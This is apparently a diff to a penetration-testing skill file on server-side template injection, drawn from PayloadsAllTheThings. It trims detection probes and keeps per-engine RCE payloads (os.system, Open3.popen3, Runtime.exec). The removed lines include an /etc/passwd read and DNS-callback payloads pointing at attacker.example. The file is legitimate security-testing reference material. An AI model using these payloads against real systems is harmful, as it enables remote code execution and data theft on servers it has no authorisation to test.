@@ -1,5 +1,5 @@
 ---
-description: Per-engine detection and RCE (Jinja2, Twig, Pug, Freemarker, ERB, etc.)
+description: Universal probe, error fingerprint, and per-engine sandbox escapes and RCE gadgets (Jinja2, Twig, Pug, Freemarker, ERB, etc.)
 skill: ssti-testing
 source: PayloadsAllTheThings — Server Side Template Injection
 source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
@@ -16,23 +16,6 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 ${{<%[%'"}}%\.
 ```
 
-Inject this and observe errors to identify the engine. Then use the decision tree:
-
-```
-${7*7} = 49?  -->  Check ${class.getForName('java.lang.Runtime')}
-  Yes -> Java (Freemarker, Velocity, Thymeleaf)
-  No  -> Try {{7*7}}
-
-{{7*7}} = 49?
-  Yes -> Try {{7*'7'}}
-    '7777777' -> Jinja2
-    '49'      -> Twig
-  No  -> Try <%= 7*7 %>
-    49 -> ERB
-    No -> Try #{7*7}
-      49 -> Pug/Jade or Slim
-```
-
 ### Error-Based Engine Fingerprinting
 
 ```
@@ -44,15 +27,6 @@ ${7*7} = 49?  -->  Check ${class.getForName('java.lang.Runtime')}
 - `ReferenceError` / `TypeError` -> Node.js (Pug/Nunjucks)
 
 ## Jinja2 (Python)
-
-### Detection
-
-```python
-{{7*7}}
-{{7*'7'}}          # returns '7777777'
-{{config.items()}}
-<pre>{% debug %}</pre>
-```
 
 ### RCE
 
@@ -102,13 +76,6 @@ ${self.module.runtime.util.os.system("id")}
 
 ## Twig (PHP)
 
-### Detection
-
-```php
-{{7*7}}
-{{dump(_context)}}
-```
-
 ### RCE
 
 ```php
@@ -142,13 +109,6 @@ ${self.module.runtime.util.os.system("id")}
 
 ## Freemarker (Java)
 
-### Detection
-
-```
-${3*3}
-#{3*3}
-```
-
 ### RCE
 
 ```
@@ -177,12 +137,6 @@ $ex.waitFor()
 
 ## ERB (Ruby)
 
-### Detection
-
-```ruby
-<%= 7 * 7 %>
-```
-
 ### RCE
 
 ```ruby
@@ -192,21 +146,7 @@ $ex.waitFor()
 <% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
 ```
 
-### File Read
-
-```ruby
-<%= File.open('/etc/passwd').read %>
-<%= Dir.entries('/') %>
-```
-
 ## Pug / Jade (Node.js)
-
-### Detection
-
-```
-#{7*7}
-#{root.process}
-```
 
 ### RCE
 
@@ -242,13 +182,6 @@ $ex.waitFor()
 ```
 
 ## Pebble (Java)
-
-### Detection
-
-```
-{{ "test" }}
-{% set x = 7 * 7 %}{{ x }}
-```
 
 ### RCE
 
@@ -295,14 +228,6 @@ GET /path/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
 
 ## Expression Language Injection
 
-### Java EL
-
-```
-${7*7}
-${applicationScope}
-${pageContext.request.serverName}
-```
-
 ### Spring SpEL
 
 ```
@@ -318,18 +243,3 @@ ${pageContext.request.serverName}
 ```
 
 Test in any parameter processed by expression evaluators — form fields, headers, URL path segments.
-
-## Blind SSTI Detection
-
-Use time-based or OOB callbacks when output is not reflected:
-
-```python
-# Jinja2 time-based
-{{ self.__init__.__globals__.__builtins__.__import__('time').sleep(5) }}
-
-# Twig DNS callback
-{{['nslookup attacker.example']|filter('system')}}
-
-# Freemarker DNS callback
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup attacker.example")}
-```
